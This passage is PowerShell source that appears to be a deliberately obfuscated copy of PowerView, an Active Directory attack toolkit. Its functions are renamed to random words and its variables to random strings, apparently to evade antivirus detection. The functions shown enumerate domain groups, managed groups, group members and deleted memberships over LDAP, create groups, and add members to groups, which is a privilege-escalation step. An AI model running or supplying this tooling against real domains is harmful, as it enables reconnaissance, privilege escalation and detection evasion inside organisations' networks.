                        $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[walnuts] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                            $nlvvSWoK99['Domain'] = $QaLnxLKT99
                            $eHXcamlz99 = misbehaves @SearcherArguments
                            if (-not $eHXcamlz99) {
                                Write-Warning "[walnuts] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                            }
                        }
                    }
                    elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                    }
                    elseif ($svVwDJqZ99.Contains('\')) {
                        $oGNyGKhb99 = $svVwDJqZ99.Replace('\28', '(').Replace('\29', ')') | oared -OutputType Canonical
                        if ($oGNyGKhb99) {
                            $oxZporZB99 = $oGNyGKhb99.SubString(0, $oGNyGKhb99.IndexOf('/'))
                            $owBLZLPg99 = $svVwDJqZ99.Split('\')[1]
                            $OfuxkWWH99 += "(samAccountName=$owBLZLPg99)"
                            $nlvvSWoK99['Domain'] = $oxZporZB99
                            Write-Verbose "[walnuts] Extracted domain '$oxZporZB99' from '$svVwDJqZ99'"
                            $eHXcamlz99 = misbehaves @SearcherArguments
                        }
                    }
                    else {
                        $OfuxkWWH99 += "(|(samAccountName=$svVwDJqZ99)(name=$svVwDJqZ99))"
                    }
                }

                if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                    $HLDsNhab99 += "(|$OfuxkWWH99)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[walnuts] Searching for adminCount=1'
                    $HLDsNhab99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $gTdGwJfy99 = $PSBoundParameters['GroupScope']
                    $HLDsNhab99 = Switch ($gTdGwJfy99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[walnuts] Searching for group scope '$gTdGwJfy99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $yUOvMuFm99 = $PSBoundParameters['GroupProperty']
                    $HLDsNhab99 = Switch ($yUOvMuFm99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[walnuts] Searching for group property '$yUOvMuFm99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[walnuts] Using additional LDAP filter: $NzjfVMfT99"
                    $HLDsNhab99 += "$NzjfVMfT99"
                }

                $eHXcamlz99.filter = "(&(objectCategory=group)$HLDsNhab99)"
                Write-Verbose "[walnuts] filter string: $($eHXcamlz99.filter)"

                if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $eHXcamlz99.FindOne() }
                else { $DEbeunXw99 = $eHXcamlz99.FindAll() }
                $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = Jagger -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($DEbeunXw99) {
                    try { $DEbeunXw99.dispose() }
                    catch {
                        Write-Verbose "[walnuts] Error disposing of the Results object"
                    }
                }
                $eHXcamlz99.dispose()
            }
        }
    }
}


function recenter {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $dKvoAcKU99,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $cAmTbDkn99,

        [ValidateNotNullOrEmpty()]
        [String]
        $vHoAkSpC99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $lmVKeZxb99 = @{
        'Identity' = $dKvoAcKU99
    }
    if ($PSBoundParameters['Domain']) { $lmVKeZxb99['Domain'] = $JXWXuoyG99 }
    if ($PSBoundParameters['Credential']) { $lmVKeZxb99['Credential'] = $tYWiEqAT99 }
    $mLYECpfd99 = vignetting @ContextArguments

    if ($mLYECpfd99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($mLYECpfd99.Context)

        $Group.SamAccountName = $mLYECpfd99.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $mLYECpfd99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $cAmTbDkn99
        }
        else {
            $Group.DisplayName = $mLYECpfd99.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $vHoAkSpC99
        }

        Write-Verbose "[recenter] Attempting to create group '$dKvoAcKU99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[recenter] Group '$dKvoAcKU99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[recenter] Error creating group '$dKvoAcKU99' : $_"
        }
    }
}


function warbling {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $nlvvSWoK99['Domain'] = $JXWXuoyG99
            $ydWBwabR99 = $JXWXuoyG99
        }
        else {
            $ydWBwabR99 = $Env:USERDNSDOMAIN
        }

        walnuts @SearcherArguments | ForEach-Object {
            $nlvvSWoK99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $nlvvSWoK99['Identity'] = $_.managedBy
            $Null = $nlvvSWoK99.Remove('LDAPFilter')

            $LoHjLQBL99 = nostrums @SearcherArguments
            $FuPjPQwW99 = New-Object PSObject
            $FuPjPQwW99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $FuPjPQwW99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $FuPjPQwW99 | Add-Member Noteproperty 'ManagerName' $LoHjLQBL99.samaccountname
            $FuPjPQwW99 | Add-Member Noteproperty 'ManagerDistinguishedName' $LoHjLQBL99.distinguishedName

            if ($LoHjLQBL99.samaccounttype -eq 0x10000000) {
                $FuPjPQwW99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($LoHjLQBL99.samaccounttype -eq 0x30000000) {
                $FuPjPQwW99 | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $vcQqByyX99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $vcQqByyX99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['SearchScope']) { $vcQqByyX99['SearchScope'] = $lGlQEcNF99 }
            if ($PSBoundParameters['ResultPageSize']) { $vcQqByyX99['ResultPageSize'] = $ixOvvLXO99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $vcQqByyX99['ServerTimeLimit'] = $EQlXfKFO99 }
            if ($PSBoundParameters['Tombstone']) { $vcQqByyX99['Tombstone'] = $adpABMuf99 }
            if ($PSBoundParameters['Credential']) { $vcQqByyX99['Credential'] = $tYWiEqAT99 }


            $FuPjPQwW99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $FuPjPQwW99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $FuPjPQwW99
        }
    }
}


function deleted {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $JIXMrevo99,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $GDqDMBFJ99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        $EWGQOOGJ99 = @{}
        if ($PSBoundParameters['Domain']) { $EWGQOOGJ99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $EWGQOOGJ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $EWGQOOGJ99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        $eHXcamlz99 = misbehaves @SearcherArguments
        if ($eHXcamlz99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $nlvvSWoK99['Identity'] = $lmPsrtYT99
                $nlvvSWoK99['Raw'] = $True
                $Group = walnuts @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[deleted] Error searching for group with identity: $lmPsrtYT99"
                }
                else {
                    $kZiBcZUj99 = $Group.properties.item('samaccountname')[0]
                    $TivrMzei99 = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $wzILODUo99 = $JXWXuoyG99
                    }
                    else {
                        if ($TivrMzei99) {
                            $wzILODUo99 = $TivrMzei99.SubString($TivrMzei99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[deleted] Using LDAP matching rule to recurse on '$TivrMzei99', only user accounts will be returned."
                    $eHXcamlz99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$TivrMzei99))"
                    $eHXcamlz99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $yQCTDBqh99 = $eHXcamlz99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $nlvvSWoK99.Remove('Raw')
            }
            else {
                $OfuxkWWH99 = ''
                $HLDsNhab99 = ''
                $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                    $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($svVwDJqZ99 -match '^S-1-') {
                        $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                    }
                    elseif ($svVwDJqZ99 -match '^CN=') {
                        $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[deleted] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                            $nlvvSWoK99['Domain'] = $QaLnxLKT99
                            $eHXcamlz99 = misbehaves @SearcherArguments
                            if (-not $eHXcamlz99) {
                                Write-Warning "[deleted] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                            }
                        }
                    }
                    elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                    }
                    elseif ($svVwDJqZ99.Contains('\')) {
                        $oGNyGKhb99 = $svVwDJqZ99.Replace('\28', '(').Replace('\29', ')') | oared -OutputType Canonical
                        if ($oGNyGKhb99) {
                            $oxZporZB99 = $oGNyGKhb99.SubString(0, $oGNyGKhb99.IndexOf('/'))
                            $owBLZLPg99 = $svVwDJqZ99.Split('\')[1]
                            $OfuxkWWH99 += "(samAccountName=$owBLZLPg99)"
                            $nlvvSWoK99['Domain'] = $oxZporZB99
                            Write-Verbose "[deleted] Extracted domain '$oxZporZB99' from '$svVwDJqZ99'"
                            $eHXcamlz99 = misbehaves @SearcherArguments
                        }
                    }
                    else {
                        $OfuxkWWH99 += "(samAccountName=$svVwDJqZ99)"
                    }
                }

                if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                    $HLDsNhab99 += "(|$OfuxkWWH99)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[deleted] Using additional LDAP filter: $NzjfVMfT99"
                    $HLDsNhab99 += "$NzjfVMfT99"
                }

                $eHXcamlz99.filter = "(&(objectCategory=group)$HLDsNhab99)"
                Write-Verbose "[deleted] deleted filter string: $($eHXcamlz99.filter)"
                try {
                    $uBmcbTpF99 = $eHXcamlz99.FindOne()
                }
                catch {
                    Write-Warning "[deleted] Error searching for group with identity '$lmPsrtYT99': $_"
                    $yQCTDBqh99 = @()
                }

                $kZiBcZUj99 = ''
                $TivrMzei99 = ''

                if ($uBmcbTpF99) {
                    $yQCTDBqh99 = $uBmcbTpF99.properties.item('member')

                    if ($yQCTDBqh99.count -eq 0) {
                        $qhfJxCxQ99 = $False
                        $BjlvIOrZ99 = 0
                        $Top = 0

                        while (-not $qhfJxCxQ99) {
                            $Top = $BjlvIOrZ99 + 1499
                            $krMMJJiR99="member;range=$BjlvIOrZ99-$Top"
                            $BjlvIOrZ99 += 1500
                            $Null = $eHXcamlz99.PropertiesToLoad.Clear()
                            $Null = $eHXcamlz99.PropertiesToLoad.Add("$krMMJJiR99")
                            $Null = $eHXcamlz99.PropertiesToLoad.Add('samaccountname')
                            $Null = $eHXcamlz99.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $uBmcbTpF99 = $eHXcamlz99.FindOne()
                                $RrYWCqhp99 = $uBmcbTpF99.Properties.PropertyNames -like "member;range=*"
                                $yQCTDBqh99 += $uBmcbTpF99.Properties.item($RrYWCqhp99)
                                $kZiBcZUj99 = $uBmcbTpF99.properties.item('samaccountname')[0]
                                $TivrMzei99 = $uBmcbTpF99.properties.item('distinguishedname')[0]

                                if ($yQCTDBqh99.count -eq 0) {
                                    $qhfJxCxQ99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $qhfJxCxQ99 = $True
                            }
                        }
                    }
                    else {
                        $kZiBcZUj99 = $uBmcbTpF99.properties.item('samaccountname')[0]
                        $TivrMzei99 = $uBmcbTpF99.properties.item('distinguishedname')[0]
                        $yQCTDBqh99 += $uBmcbTpF99.Properties.item($RrYWCqhp99)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $wzILODUo99 = $JXWXuoyG99
                    }
                    else {
                        if ($TivrMzei99) {
                            $wzILODUo99 = $TivrMzei99.SubString($TivrMzei99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($VoXrAEUj99 in $yQCTDBqh99) {
                if ($JIXMrevo99 -and $jxctIdBx99) {
                    $hqDcSuel99 = $_.Properties
                }
                else {
                    $QlYHYFNb99 = $nlvvSWoK99.Clone()
                    $QlYHYFNb99['Identity'] = $VoXrAEUj99
                    $QlYHYFNb99['Raw'] = $True
                    $QlYHYFNb99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = nostrums @ObjectSearcherArguments
                    $hqDcSuel99 = $Object.Properties
                }

                if ($hqDcSuel99) {
                    $MkpsBssw99 = New-Object PSObject
                    $MkpsBssw99 | Add-Member Noteproperty 'GroupDomain' $wzILODUo99
                    $MkpsBssw99 | Add-Member Noteproperty 'GroupName' $kZiBcZUj99
                    $MkpsBssw99 | Add-Member Noteproperty 'GroupDistinguishedName' $TivrMzei99

                    if ($hqDcSuel99.objectsid) {
                        $zxYTkuyV99 = ((New-Object System.Security.Principal.SecurityIdentifier $hqDcSuel99.objectsid[0], 0).Value)
                    }
                    else {
                        $zxYTkuyV99 = $Null
                    }

                    try {
                        $ekUDPlaC99 = $hqDcSuel99.distinguishedname[0]
                        if ($ekUDPlaC99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $zxYTkuyV99) {
                                    $zxYTkuyV99 = $hqDcSuel99.cn[0]
                                }
                                $gPxLzDgf99 = oared -Identity $zxYTkuyV99 -OutputType 'DomainSimple' @ADNameArguments

                                if ($gPxLzDgf99) {
                                    $vChEFBMO99 = $gPxLzDgf99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[deleted] Error converting $ekUDPlaC99"
                                    $vChEFBMO99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[deleted] Error converting $ekUDPlaC99"
                                $vChEFBMO99 = $Null
                            }
                        }
                        else {
                            $vChEFBMO99 = $ekUDPlaC99.SubString($ekUDPlaC99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $ekUDPlaC99 = $Null
                        $vChEFBMO99 = $Null
                    }

                    if ($hqDcSuel99.samaccountname) {
                        $GjUvxgOd99 = $hqDcSuel99.samaccountname[0]
                    }
                    else {
                        try {
                            $GjUvxgOd99 = recollection -ObjectSID $hqDcSuel99.cn[0] @ADNameArguments
                        }
                        catch {
                            $GjUvxgOd99 = $hqDcSuel99.cn[0]
                        }
                    }

                    if ($hqDcSuel99.objectclass -match 'computer') {
                        $lcvgTyXx99 = 'computer'
                    }
                    elseif ($hqDcSuel99.objectclass -match 'group') {
                        $lcvgTyXx99 = 'group'
                    }
                    elseif ($hqDcSuel99.objectclass -match 'user') {
                        $lcvgTyXx99 = 'user'
                    }
                    else {
                        $lcvgTyXx99 = $Null
                    }
                    $MkpsBssw99 | Add-Member Noteproperty 'MemberDomain' $vChEFBMO99
                    $MkpsBssw99 | Add-Member Noteproperty 'MemberName' $GjUvxgOd99
                    $MkpsBssw99 | Add-Member Noteproperty 'MemberDistinguishedName' $ekUDPlaC99
                    $MkpsBssw99 | Add-Member Noteproperty 'MemberObjectClass' $lcvgTyXx99
                    $MkpsBssw99 | Add-Member Noteproperty 'MemberSID' $zxYTkuyV99
                    $MkpsBssw99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $MkpsBssw99

                    if ($PSBoundParameters['Recurse'] -and $ekUDPlaC99 -and ($lcvgTyXx99 -match 'group')) {
                        Write-Verbose "[deleted] Manually recursing on group: $ekUDPlaC99"
                        $nlvvSWoK99['Identity'] = $ekUDPlaC99
                        $Null = $nlvvSWoK99.Remove('Properties')
                        deleted @SearcherArguments
                    }
                }
            }
            $eHXcamlz99.dispose()
        }
    }
}


function fating {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nlvvSWoK99['Identity'] = $lmPsrtYT99 }

        nostrums @SearcherArguments | ForEach-Object {
            $PpMDEFqG99 = $_.Properties['distinguishedname'][0]
            ForEach($ZJAVlGUh99 in $_.Properties['msds-replvaluemetadata']) {
                $dZONjLgn99 = [xml]$ZJAVlGUh99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($dZONjLgn99) {
                    if (($dZONjLgn99.pszAttributeName -Match 'member') -and (($dZONjLgn99.dwVersion % 2) -eq 0 )) {
                        $MWaxCMux99 = New-Object PSObject
                        $MWaxCMux99 | Add-Member NoteProperty 'GroupDN' $PpMDEFqG99
                        $MWaxCMux99 | Add-Member NoteProperty 'MemberDN' $dZONjLgn99.pszObjectDn
                        $MWaxCMux99 | Add-Member NoteProperty 'TimeFirstAdded' $dZONjLgn99.ftimeCreated
                        $MWaxCMux99 | Add-Member NoteProperty 'TimeDeleted' $dZONjLgn99.ftimeDeleted
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingChange' $dZONjLgn99.ftimeLastOriginatingChange
                        $MWaxCMux99 | Add-Member NoteProperty 'TimesAdded' ($dZONjLgn99.dwVersion / 2)
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dZONjLgn99.pszLastOriginatingDsaDN
                        $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $MWaxCMux99
                    }
                }
                else {
                    Write-Verbose "[fating] Error retrieving 'msds-replvaluemetadata' for '$PpMDEFqG99'"
                }
            }
        }
    }
}


function conking {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $lmPsrtYT99,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $yQCTDBqh99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $lmVKeZxb99 = @{
            'Identity' = $lmPsrtYT99
        }
        if ($PSBoundParameters['Domain']) { $lmVKeZxb99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Credential']) { $lmVKeZxb99['Credential'] = $tYWiEqAT99 }

        $vOXddvUR99 = vignetting @ContextArguments

        if ($vOXddvUR99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($vOXddvUR99.Context, $vOXddvUR99.Identity)
            }
            catch {
                Write-Warning "[conking] Error finding the group identity '$lmPsrtYT99' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($VoXrAEUj99 in $yQCTDBqh99) {
                if ($VoXrAEUj99 -match '.+\\.+') {
                    $lmVKeZxb99['Identity'] = $VoXrAEUj99
                    $taPnwxkO99 = vignetting @ContextArguments
                    if ($taPnwxkO99) {
                        $CgAKgSWG99 = $taPnwxkO99.Identity
                    }
                }
                else {
                    $taPnwxkO99 = $vOXddvUR99
                    $CgAKgSWG99 = $VoXrAEUj99
                }
                Write-Verbose "[conking] Adding member '$VoXrAEUj99' to group '$lmPsrtYT99'"
                $VoXrAEUj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($taPnwxkO99.Context, $CgAKgSWG99)
                $Group.Members.Add($VoXrAEUj99)
                $Group.Save()
            }
        }
    }
}


function misgoverned {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $lmPsrtYT99,

